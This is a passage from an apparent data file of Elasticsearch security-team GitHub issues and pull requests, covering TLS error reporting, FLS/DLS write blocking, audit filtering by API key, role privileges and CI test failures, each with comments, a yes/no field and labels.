OUTPUT: Handshake message: ClientHello[29 cipher suites; suites: TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256, TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256, TLS_RSA_WITH_AES_128_CBC_SHA256, TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA256, TLS_ECDH_RSA_WITH_AES_128_CBC_SHA256, TLS_DHE_RSA_WITH_AES_128_CBC_SHA256, TLS_DHE_DSS_WITH_AES_128_CBC_SHA256, TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA, TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA, TLS_RSA_WITH_AES_128_CBC_SHA, TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA, TLS_ECDH_RSA_WITH_AES_128_CBC_SHA, TLS_DHE_RSA_WITH_AES_128_CBC_SHA, TLS_DHE_DSS_WITH_AES_128_CBC_SHA, TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, TLS_RSA_WITH_AES_128_GCM_SHA256, TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256, TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256, TLS_DHE_RSA_WITH_AES_128_GCM_SHA256, TLS_DHE_DSS_WITH_AES_128_GCM_SHA256, TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA, TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA, TLS_RSA_WITH_3DES_EDE_CBC_SHA, TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA, TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA, TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA, TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA, TLS_EMPTY_RENEGOTIATION_INFO_SCSV]
INPUT: Handshake message: ServerHello[TLS 1.2, TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256, keyex ECDHE_RSA]
Handshake message: CertificateMessage[1 certificates]
0: CN=local
  subjectAlt: DNS:localhost
  subjectAlt: IP:127.0.0.1
Handshake message: ServerKeyExchange
Handshake message: ServerHelloDone
```

For my prototype, there is much work to be done to improve the failure reporting, but this is *significantly* better than the default SSLEngine/SSLSocket exception stack traces.

My code is here: https://github.com/elastic/tealess/

My intent is to deploy this with Logstash, but I believe strongly that Elasticsearch *must* use this or a similar strategy to improve SSL/TLS user experience problems.","*Original comment by @jaymode:*

@tvernum @albertzaharovits @joshbressers I definitely think that this is something we should have before we push TLS on the masses with the upcoming move to enabling it for basic licenses.*Original comment by @joshbressers:*

This is fantastic, we should do this everywhere.",no,">enhancement,:Security/TLS,Team:Security,"
elastic/elasticsearch,317447208,"block write requests when user has FLS/DLS permissions for an index","*Original comment by @jaymode:*

We should add an interceptor for index/update/delete(?) requests so that we can fail the request if the user has DLS/FLS enabled. This is just a safeguard to prevent someone from thinking that writes are also protected.

@uboness @skearns64 wdyt?


","*Original comment by @skearns64:*

I like this because it would make the current behavior much more clear. My concern is whether there are valid use-cases that this would prevent.. I can't think of one, but I feel like they might exist.

Are all users that have FLS/DLS enabled really read-only? What if I have the admin role, AND also have a role with FLS/DLS on an index? I should be able to write to that index. 
*Original comment by @jaymode:*

> Are all users that have FLS/DLS enabled really read-only? 

Not completely. They should be considered read only for the indices with DLS/FLS access controls defined. If they have full permissions to another index and are writing to that index, then that request would be allowed.

> What if I have the admin role, AND also have a role with FLS/DLS on an index? I should be able to write to that index.

Today this works; with the most basic implementation of what I propose it will not work. Why do you have a role with limited access and a role without limited access?
*Original comment by @skearns64:*

>  Why do you have a role with limited access and a role without limited access?

I'm not sure, but it's something I've seen happen in the past. Admins get assigned the admin role, and their accounts might inherit other roles based on the groups they're in. For example, if I'm using AD, and  the AD ""Domain Users"" group gets assigned the ""limited_user"" role, now I've got Admin and limited roles. 
*Original comment by @martijnvg:*

+1 I think this makes sense until there this FLS/DLS also for write requests. Although I can't think of a reason right now why this would be harmful, they way FLS/DLS is implemented is a read feature.

Btw for update this already partly the case. If an update request comes in with FLS enabled for the targeted index then the update request is rejected.
",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1109591456,"grants kibana_system access to all privileges to percolator indices","Required for the POC percolator implementation for speeding up the indicator match rule (security solution)","Pinging @elastic/es-security (Team:Security)@elasticmachine merge upstream@ecezalp please enable the option ""Allow edits and access to secrets by maintainers"" on your PR. For more information, [see the documentation](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/allowing-changes-to-a-pull-request-branch-created-from-a-fork).",yes,">enhancement,:Security/Authorization,Team:Security,external-contributor,auto-backport,"
elastic/elasticsearch,753547830,"[CI] ActiveDirectoryRealmTests testAuthenticateCachesSuccessfulAuthentications failure","**Build scan**:
https://gradle-enterprise.elastic.co/s/x4kmxhrirowya

**Repro line**:
 ./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.authc.ldap.ActiveDirectoryRealmTests.testAuthenticateCachesSuccessfulAuthentications"" \
  -Dtests.seed=1AB50D910E1DF1E \
  -Dtests.security.manager=true \
  -Dtests.locale=be \
  -Dtests.timezone=Antarctica/South_Pole \
  -Druntime.java=8

**Reproduces locally?**:
No

**Applicable branches**:
7.x

**Failure history**:
Just once, I can't find any other failures

**Failure excerpt**:
```
org.mockito.exceptions.verification.TooManyActualInvocations: 
activeDirectorySessionFactory.getSessionWithoutPool(
    ""CN=ironman"",
    <any>,
    <any>
);
Wanted 1 time:
-> at org.elasticsearch.xpack.security.authc.ldap.PoolingSessionFactory.session(PoolingSessionFactory.java:98)
But was 9 times. Undesired invocation:
-> at org.elasticsearch.xpack.security.authc.ldap.PoolingSessionFactory.session(PoolingSessionFactory.java:98)

	at __randomizedtesting.SeedInfo.seed([1AB50D910E1DF1E:FB08E3E2537D363B]:0)
	at org.elasticsearch.xpack.security.authc.ldap.PoolingSessionFactory.session(PoolingSessionFactory.java:98)
	at org.elasticsearch.xpack.security.authc.ldap.ActiveDirectoryRealmTests.testAuthenticateCachesSuccessfulAuthentications(ActiveDirectoryRealmTests.java:241)
```

","Pinging @elastic/es-security (Team:Security)",no,">test-failure,:Security/Security,Team:Security,"
elastic/elasticsearch,1327273790,"Improve SAML warning message when signing credentials cannot be found","This commit attempts to provide a better hint in case when the signature
cannot not be validated because we can't find any signing key
in the configured metadata file.","@elasticmachine run elasticsearch-ci/bwc@elasticmachine update branchPinging @elastic/es-security (Team:Security)",yes,">enhancement,>non-issue,:Security/Authentication,Team:Security,v8.6.0,"
elastic/elasticsearch,464557112,"[CI] Race between FileUserRolesStore and disk cleanup","An `@After` method doing post test cleanup failed in https://elasticsearch-ci.elastic.co/job/elastic+elasticsearch+master+multijob-unix-compatibility/os=oraclelinux-7/103/console

The relevant part of the log file is this:

```
  1> [2019-06-30T20:56:25,503][INFO ][o.e.n.Node               ] [suite] closing ...
  1> [2019-06-30T20:56:25,507][INFO ][o.e.n.Node               ] [suite] closed
  1> [2019-06-30T13:56:25,516][INFO ][o.e.x.s.a.f.FileUserRolesStore] [external_8] users roles file [/var/lib/jenkins/workspace/elastic+elasticsearch+master+multijob-unix-compatibility/os/oraclelinux-7/x-pack/plugin/ml/qa/native-multi-node-tests/build/testrun/integTestRunner/temp/org.elasticsearch.xpack.ml.integration.ForecastIT_A5BFFFA50FDD9F61-001/tempDir-003/config/users_roles] changed. updating users roles...
  2> java.io.IOException: Could not remove the following files (in the order of attempts):
       /var/lib/jenkins/workspace/elastic+elasticsearch+master+multijob-unix-compatibility/os/oraclelinux-7/x-pack/plugin/ml/qa/native-multi-node-tests/build/testrun/integTestRunner/temp/org.elasticsearch.xpack.ml.integration.ForecastIT_A5BFFFA50FDD9F61-001/tempDir-003/config: java.io.IOException: access denied: /var/lib/jenkins/workspace/elastic+elasticsearch+master+multijob-unix-compatibility/os/oraclelinux-7/x-pack/plugin/ml/qa/native-multi-node-tests/build/testrun/integTestRunner/temp/org.elasticsearch.xpack.ml.integration.ForecastIT_A5BFFFA50FDD9F61-001/tempDir-003/config
       /var/lib/jenkins/workspace/elastic+elasticsearch+master+multijob-unix-compatibility/os/oraclelinux-7/x-pack/plugin/ml/qa/native-multi-node-tests/build/testrun/integTestRunner/temp/org.elasticsearch.xpack.ml.integration.ForecastIT_A5BFFFA50FDD9F61-001/tempDir-003: java.nio.file.DirectoryNotEmptyException: /var/lib/jenkins/workspace/elastic+elasticsearch+master+multijob-unix-compatibility/os/oraclelinux-7/x-pack/plugin/ml/qa/native-multi-node-tests/build/testrun/integTestRunner/temp/org.elasticsearch.xpack.ml.integration.ForecastIT_A5BFFFA50FDD9F61-001/tempDir-003
  2> REPRODUCE WITH: ./gradlew :x-pack:plugin:ml:qa:native-multi-node-tests:integTestRunner --tests ""org.elasticsearch.xpack.ml.integration.ForecastIT"" -Dtests.seed=A5BFFFA50FDD9F61 -Dtests.security.manager=true -Dtests.locale=en-US -Dtests.timezone=UTC -Dcompiler.java=12 -Druntime.java=11
  2> NOTE: test params are: codec=Asserting(Lucene80): {}, docValues:{}, maxPointsInLeafNode=799, maxMBSortInHeap=7.242438413406605, sim=Asserting(org.apache.lucene.search.similarities.AssertingSimilarity@39e6b55c), locale=shi-Latn-MA, timezone=Asia/Vientiane
  2> NOTE: Linux 4.14.35-1902.2.0.el7uek.x86_64 amd64/Oracle Corporation 11.0.3 (64-bit)/cpus=16,threads=1,free=90554224,total=536870912
  2> NOTE: All tests run in this JVM: [AutodetectMemoryLimitIT, BasicRenormalizationIT, CategorizationIT, DatafeedJobsIT, DatafeedJobsRestIT, DatafeedWithAggsIT, DelayedDataDetectorIT, DeleteExpiredDataIT, DetectionRulesIT, ForecastIT]
```

It tried to delete the directory `.../tempDir-003/config` but could not because the directory wasn't empty.

Presumably it wasn't empty because `FileUserRolesStore` had just written `.../tempDir-003/config/users_roles` into it.  This is done by writing a temporary file, then renaming it to the eventual path.  So it could easily confuse a recursive directory deletion routine running at the same time.  The recursive directory deletion probably did successfully delete the previous version of the `users_roles` file.

Maybe `FileUserRolesStore` needs to register itself with `Node` so that `Node` can wait for it to complete during its shutdown sequence?

This failure has only occurred once as far as I can see, so we don't necessarily need to rush to fix it.  But I wanted to log an issue so that if it starts happening frequently there's something to reference with the investigation I've done so far.","Pinging @elastic/es-securityIt looks like this failed again for the same reason:
```
org.elasticsearch.xpack.ml.integration.ForecastIT > classMethod FAILED
--
java.io.IOException: Could not remove the following files (in the order of attempts):
/var/lib/jenkins/workspace/elastic+elasticsearch+master+matrix-java-periodic/ES_BUILD_JAVA/openjdk12/ES_RUNTIME_JAVA/zulu12/nodes/general-purpose/x-pack/plugin/ml/qa/native-multi-node-tests/build/testrun/integTestRunner/temp/org.elasticsearch.xpack.ml.integration.ForecastIT_49CA3E0C9396C02E-001/tempDir-003/config: java.io.IOException: access denied: /var/lib/jenkins/workspace/elastic+elasticsearch+master+matrix-java-periodic/ES_BUILD_JAVA/openjdk12/ES_RUNTIME_JAVA/zulu12/nodes/general-purpose/x-pack/plugin/ml/qa/native-multi-node-tests/build/testrun/integTestRunner/temp/org.elasticsearch.xpack.ml.integration.ForecastIT_49CA3E0C9396C02E-001/tempDir-003/config
/var/lib/jenkins/workspace/elastic+elasticsearch+master+matrix-java-periodic/ES_BUILD_JAVA/openjdk12/ES_RUNTIME_JAVA/zulu12/nodes/general-purpose/x-pack/plugin/ml/qa/native-multi-node-tests/build/testrun/integTestRunner/temp/org.elasticsearch.xpack.ml.integration.ForecastIT_49CA3E0C9396C02E-001/tempDir-003: java.nio.file.DirectoryNotEmptyException: /var/lib/jenkins/workspace/elastic+elasticsearch+master+matrix-java-periodic/ES_BUILD_JAVA/openjdk12/ES_RUNTIME_JAVA/zulu12/nodes/general-purpose/x-pack/plugin/ml/qa/native-multi-node-tests/build/testrun/integTestRunner/temp/org.elasticsearch.xpack.ml.integration.ForecastIT_49CA3E0C9396C02E-001/tempDir-003

```
https://gradle-enterprise.elastic.co/s/mqxsdvj2bcqb6/tests/zcquf3hc3eoda-d2oyncgpb7reu?openStackTraces=WzBd
",no,">test-failure,:Security/Security,Team:Security,"
elastic/elasticsearch,454522976,"Better error messages for common TLS problems","We have a goal of making TLS easier (see #41182).

One of the concrete ways that we can do that is to improve the error messages that users get when TLS fails.
This is a meta issue to track the various scenarios that we would like to improve.

### Overall goals
- Failures should be as early as possible. If we can detect a configuration problem at node start-up, then we should.
- Messages should explain the cause of the problem in terms a human can understand.
- Messages should indicate how the problem can be resolved in as specific terms as possible (e.g. By indicating which ES settings control the behaviour).
- Messages should _not_ hide the technical details that would be useful to ES engineers or  other people who understand TLS.
- Warnings can be written to the logs if we detect something that seems to be wrong, but we should not assume that the logs will be consulted unless something breaks, and we should avoid ""spamming"" log files with repeated or recurring messages. 

### Glossary
In the scenarios below...
- **Resources** refers to Keystores, Truststores, Keys & Certificates as appropriate.
- **TLS** refers to any version of SSL/TLS unless it explicitly indicates a version

### Scenarios where good messages will help resolve problems: 
_Note: Some of these scenarios overlap._
- [x] Resources that are missing (typo in settings, or not relative to config directory) #44787
- [x] Resources that cannot be read due to file permissions #44787
- [x] Resources that cannot be read due to the security manager (wrong directory) #44787
- [ ] Resources that cannot be read due to incorrect password
- [ ] Resources that cannot be read due to missing password (password required, but not provided)
- [ ] Resources in an incorrect format (e.g. PKCS#12 file in `certificate_authorities`) 
- [ ] Resources that are corrupt or malformed (random data in a .crt file) 
- [ ] Resources configured, but not enabled (e.g. `xpack.security.transport.ssl.key` is set, but  `xpack.security.transport.ssl.enabled` is not). This should be a warning in 7.x, but 8.0 could require an explicit value for `ssl.enabled` if any other `ssl.*` key is configured. #45892
- [ ] TLS enabled but not configured (e.g. `xpack.security.transport.ssl.enabled` is true, but no resources have been configured).  #45892
- [ ] Configured certificate, but no key
- [ ] Configured key, but no certificate
- [ ] Mismatched certificate & key
- [ ] Configured truststore (or `certificate_authorities`) does not contain any trusted CAs
- [ ] Configured keystore does not contain any key-pairs.
- [ ] Client: Handshake failed due to no cipher suites in common 
- [ ] Server: No cipher suites in common: unrecognised cipher suites 
- [ ] Server: No cipher suites in common: client's suites are recognised but disabled
- [ ] No TLS version in common (server & client)
- [ ] Provided certificate is signed by a CA that is unknown to us
- [ ] Provided certificate is signed by a CA that is known to us but not trusted in this context (e.g. JRE's cacerts)
- [ ] A full certificate chain was provided, but we don't trust it
- [ ] A partial certificate chain was provided, and we don't recognise any of it
- [ ] A certificate was provided the matches the DN of a certifcate we know/trust, but is not the same certificate (e.g. user incorrectly generates multiple CAs with `CN=Elastic Certificate Tool Autogenerated CA`)
- [ ] Certificate has expired.
- [ ] Certificate is not yet valid.
- [ ] Hostname verification is enabled (`verification_mode: full`) but server certificate does not contain any SANs.
- [ ] The server certificate does not match the hostname we used.
- [ ] The server certificate only contains DNS SANs but we are connecting via IP (typical solution is to configure `publish_host`)
- [ ] Server requires a client certificate, but we don't have one
- [ ] Server rejected our client certificate (Unknown CA)
- [ ] Client does not trust this server's certificate
- [ ] A certificate has been configured as a CA, but is not a valid issuer 
- [ ] A certificate has been configured as a server/client certificate, but is a CA (warning only) 
- [ ] A certificate has an Extended Key Usage of server-only, but is being used on a client.
- [ ] A certificate has an Extended Key Usage of client-only, but is being used on a server.
- [x] Plaintext on an TLS connection (https://github.com/elastic/elasticsearch/pull/45852, for transport and HTTP)
- [ ] TLS on a plaintext connection







","Pinging @elastic/es-securityrelated https://github.com/elastic/elasticsearch/issues/32688",no,">enhancement,Meta,:Security/TLS,Team:Security,"
elastic/elasticsearch,317447346,"Add manage_aliases, manage_templates and open_close_indices as separate privileges","*Original comment by @ppf2:*

> manage
> All monitor privileges plus index administration (aliases, analyze, cache clear, close, delete, exists, flush, mapping, open, force merge, refresh, settings, search shards, templates, validate, warmers)

The manage privilege today includes the ability to perform destructive actions like delete index.

Since delete_index is already a separate privilege, this is a request to remove delete_index from manage so that customers can give manage role to users who will be setting up the schema/mappings,templates,aliases, without also giving them the ability to delete the index.

And if they need delete_index, they can separately add it to the role.

Please consider this for 5.0.  The customer is working around this on 2.x using the no-longer-recommended granular setting for action level privileges (which has already been removed from the product on 5.0).","*Original comment by @jaymode:*

@bizybot I think this might be another good issue for you to look into*Original comment by @bizybot:*

@jaymode Sure will start looking into it. Thanks.",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1240687228,"Provide a way to filter out audit events by API key","From discussion with @ywangd (❤️), we can't actually use `xpack.security.audit.logfile.events.ignore_filters.<policy_name>.realms` to filter out audit events with `elasticsearch.audit.realm`.

For API keys, the realm used internally for filtering is its owner's realm instead of the synthetic `_es_api_key`. For example, if user `foo` from the `native1` realm creates an API key, internally the realm used for filtering is `native1`, not `_es_api_key`. 

For now we can workaround it by filtering for both the `username` (`xpack.security.audit.logfile.events.ignore_filters.<policy_name>.users`) and the _user's_ `realm` (`xpack.security.audit.logfile.events.ignore_filters.<policy_name>.realms`).

","Pinging @elastic/es-security (Team:Security)Can you clarify the requirement a bit more?

As far as I understand, everything is working the way that we would expect - audit log filtering is applied to the user that owns the API key. 
That seems like the correct behaviour to me. If a user creates an API key, the auditing of actions taken by that API key ought to be audited in the same way as the user itself. Otherwise API keys could become an avenue by which a person can by-pass auditing.

So my question is - what is driving the need to filter out API keys? It is because they are used by Kibana Alerting (and therefore produce a high volume of noise)?

The ES Security team's view on auditing has generally been that discarding audit logs because you don't think they're important is a risky path. Our recommendation continues to be to audit widely, and then pay more attention to the high risk entries and anomalies. That means that when an anomaly is found it is possible to go back and look for other events from the same user/timeframe and try and understand the full sequence of actions that were taken. If those audit logs were never captured that option is not available. 
 
If there is an assumption that alerting is always safe and never needs to be audited, then I would question that assumption. If it's a matter of de-duplicating information (for example, so we don't store multiple copies of the identical search body for an alert that runs every 60s) then that's a much more interesting line of discussion.  
It would be helpful to understand the underlying driver to filter out API keys from the audit logs so that we can perhaps offer a safer solution to the core problem rather than simply encouraging administrators to get themselves into a situation where they're dropping events that they might need. Thanks for the feedback! Given that this is working as designed, I see this as more of a documentation clarification request.  For those who are looking to filter out specific audit events (usually it's because of the cost associated to storage a large number of events they are not interested in), they will think that they can specify any values from the field `elasticsearch.audit.realm` in the `xpack.security.audit.logfile.events.ignore_filters.<policy_name>.realms` filter.

<img width=""738"" alt=""image"" src=""https://user-images.githubusercontent.com/7216393/169896436-610fec40-f99e-4bbb-ab68-674799288697.png"">

Perhaps we can use a note to clarify the behavior when setting the ignore_filter > realms to `_es_api_key`?  For example, we can explicitly state that it does not work with `_es_api_key` by design and the best practice for those who are looking to filter out events associated to specific API keys is to create a specific ""API"" user to generate the API keys so they can use the ignore_filter > users to filter out requests associated to the API key(s). Thx!


There is a `realm` field in the (REST layer) `authenticationSuccess` event. This field has value `_es_api_key` when the authenticating subject is an API key. This is not consistent with the value of `user.realm` (owner realm of an API key) which is available in multiple events (including `authenticationSuccess`). Internally we know how it works. But our docs do not explain this clearly enough. There are other fields that have `realm` in their names. It is not obvious whether the `realms` filter should apply to them as well. Aside from documentation ... on the product side:

- We may want to consider allowing users to add ignore filters against `elasticsearch.audit.apikey.name` if possible.  When reviewing audit logs, users may want to quickly filter out by specific api key names.  The use case is that they might have an admin user create multiple API keys so the `user.name` will always be the same person, but they want to be able to filter by api key name (e.g. they can have specific API key names tied to various beats/agent processes), etc..The challenge with API Key names is that they're not unique, and they can be freely chosen by the API key creator.
So, filtering on name would only be safe if you also filter by owner, _and_ you trust that there will never be a rogue API key created by that owner.  
But, if you trust the owner that much, can't you just ignore everything they do?

Filtering by API key ID is safer, but harder because IDs are opaque and have not meaning to customers.
Here's another use case for the ability to filter out by API key.  With `authentication_success` enabled, we are logging >100K a day of events (for a small cluster) associated to out of the box Stack Monitoring alerts with `elasticsearch.audit.apikey.name` set to:

```
Alerting: monitoring_alert_missing_monitoring_data/Missing monitoring data	
Alerting: monitoring_alert_disk_usage/Disk Usage
Alerting: monitoring...
...
```

Some admins are not interested in audit events that are generated by out of the box Stack Monitoring alerts and would like a way to filter them out.
",no,":Security/Audit,Team:Security,"
elastic/elasticsearch,317447623,"Improve Marvel license message for better usability","*Original comment by @bohyun-e:*

Currently, we provide the following message to users installing their basic license, i.e. downgrading from trial/gold/platinum to basic license (or from trial/platinum to gold).

``` json
{
  ""acknowledged"": false,
  ""license_status"": ""valid"",
  ""acknowledge"": {
    ""message"": ""This license update requires acknowledgement. To acknowledge the license, please read the following messages and update the license again, this time with the \""acknowledge=true\"" parameter:"",
    ""marvel"": [
      ""basic"",
      ""Automatic index cleanup is locked to 7 days for clusters with [{}] license.basic""
    ]
  }
}
```

Could we improve this message for better usability where the users can just copy and paste? Maybe we can switch it to a single quote to avoid the obvious escaping as @pickypg suggested. Also, it may not even need the ""=true"" portion as ""_license?acknowledge"" would do it?

/cc @tsullivan @pickypg 


","*Original comment by @clintongormley:*

Single quotes are not allowed in JSON and are not accepted by Elasticsearch.

> Also, it may not even need the ""=true"" portion as ""_license?acknowledge"" would do it?

Correct.  
*Original comment by @uboness:*

I would remove the quotes all together and instead put the relative URL (with the param) in `[...]`
*Original comment by @pickypg:*

@clintongormley 

> Single quotes are not allowed in JSON and are not accepted by Elasticsearch.

I have never come across this before. Wow, that's a subtle rule.
",no,":Data Management/Monitoring,:Security/License,Team:Data Management,Team:Security,"
elastic/elasticsearch,1404248079,"[Test] Enable more loggings for testJwkSetUpdates","This PR adds an additional logging for realm AuthenticationResult and also enables trace logging for testJwkSetUpdates. The goal is to get more details about the non-reproducible JWK set update failure. Trace logging will be removed once we get more insights about the failure.

Read more at
https://github.com/elastic/elasticsearch/issues/90467#issuecomment-1272868670

Relates: #90467
","Pinging @elastic/es-security (Team:Security)",yes,">test,:Security/Authentication,Team:Security,v8.6.0,"
elastic/elasticsearch,781600051,"Publish rest API spec for SAML, OIDC and PKI service-provider oriented APIs","We have a couple of APIs that are not intended to be used by regular clients, i.e. clients that are interested in accessing or administering ES.
The following APIs are low level in the sense that they are used by Kibana, in cases where the responsibilities of authentication flows are divided between Kibana and Elasticsearch. Elasticsearch cannot assume all responsibilities in those cases because it is not a HTTP Server.

[Delegate PKI authentication](https://www.elastic.co/guide/en/elasticsearch/reference/7.x/security-api-delegate-pki-authentication.html)

[OpenID Connect Prepare Authentication API](https://www.elastic.co/guide/en/elasticsearch/reference/7.x/security-api-oidc-prepare-authentication.html)
[OpenID Connect authenticate API](https://www.elastic.co/guide/en/elasticsearch/reference/7.x/security-api-oidc-authenticate.html)
[OpenID Connect logout API](https://www.elastic.co/guide/en/elasticsearch/reference/7.x/security-api-oidc-logout.html)

[SAML prepare authentication API](https://www.elastic.co/guide/en/elasticsearch/reference/7.x/security-api-saml-prepare-authentication.html)
[SAML authenticate API](https://www.elastic.co/guide/en/elasticsearch/reference/7.x/security-api-saml-authenticate.html)
[SAML logout API](https://www.elastic.co/guide/en/elasticsearch/reference/7.x/security-api-saml-logout.html)
[SAML invalidate API](https://www.elastic.co/guide/en/elasticsearch/reference/7.x/security-api-saml-invalidate.html)
[SAML service provider metadata API](https://www.elastic.co/guide/en/elasticsearch/reference/7.x/security-api-saml-sp-metadata.html)

In general, a client that calls such APIs takes the role of the smart HTTP proxy to Elasticsearch.

Given the limited use cases of such APIs, we initially made the conscious decision to not publish the REST spec which is the template for language client's request objects. This way, language clients don't expose dedicated methods for low level actions. 

But we do document the APIs, and internal APIs such as autoscaling also publish their rest spec.

On consistency grounds, should we backtrack on the original decision, and expose the rest spec for the above APIs?","Pinging @elastic/es-security (Team:Security)CC @azasypkin Hey! Have you made any decision on that one already?Hi @azasypkin , we discussed this in a team meeting recently and we agree we need to do this. I will take care of the SAML APIs and @albertzaharovits will write the OIDC APIs specs.",no,">enhancement,:Security/Security,team-discuss,Team:Security,"
elastic/elasticsearch,317449581,"More granular user editing privileges","*Original comment by @joshbressers:*

From the forum
https://discuss.elastic.co/t/security-discussion/83714

> Meta security
> 
> Some of our users should be able to manage a sub-set of other users. It would be good to have this enforced at an Elastic+Security level. Kind of like document level security, but for users.
> 
> I notice that if Security had been implemented, for example, by a special index and data format, these features would all be inherently offered by existing ES functionality as well as making it easier for you without necessarily having to provide a separate API. This approach has been valuable in e.g. the implementation of Watcher.

This could make sense for the user API.","*Original comment by @skearns64:*

I'm a fan of this in the long term. I wonder if we could get some mileage in the nearer term with a simpler change: 

We could add a restriction such that a user (UserA) with the manage users and manage/assign roles privileges could not create roles that have more privileges than UserA has, and not only assign roles to users unless UserA has those roles. Basically, prevent anyone from granting themselves or anyone else more privileges than they have today. This means that the superuser would still have full power. 

This approach would work in a multi-tenant scenario, where the cluster admin could provision a tenant-admin to manage access to their indexes, etc. ",no,">feature,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1031515073,"[CI] LdapRealmTests testAuthenticateSubTreeGroupSearch failing","**Build scan:**
https://gradle-enterprise.elastic.co/s/wrzmrxsapqjsu/tests/:x-pack:plugin:security:test/org.elasticsearch.xpack.security.authc.ldap.LdapRealmTests/testAuthenticateSubTreeGroupSearch

**Reproduction line:**
`./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.authc.ldap.LdapRealmTests.testAuthenticateSubTreeGroupSearch"" -Dtests.seed=EA582D836AF68114 -Dtests.locale=es-PR -Dtests.timezone=Asia/Famagusta -Druntime.java=8`

**Applicable branches:**
7.x

**Reproduces locally?:**
Didn't try

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.xpack.security.authc.ldap.LdapRealmTests&tests.test=testAuthenticateSubTreeGroupSearch

**Failure excerpt:**
```
java.lang.AssertionError: 
Expected: is <SUCCESS>
     but: was <CONTINUE>

  at __randomizedtesting.SeedInfo.seed([EA582D836AF68114:4D80CE248F0D3329]:0)
  at org.hamcrest.MatcherAssert.assertThat(MatcherAssert.java:18)
  at org.junit.Assert.assertThat(Assert.java:956)
  at org.junit.Assert.assertThat(Assert.java:923)
  at org.elasticsearch.xpack.security.authc.ldap.LdapRealmTests.testAuthenticateSubTreeGroupSearch(LdapRealmTests.java:139)
  at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-2)
  at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
  at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
  at java.lang.reflect.Method.invoke(Method.java:498)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1750)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:938)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:974)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:988)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:49)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
  at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:48)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:817)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:468)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:947)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:832)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:883)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:894)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:41)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
  at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:54)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
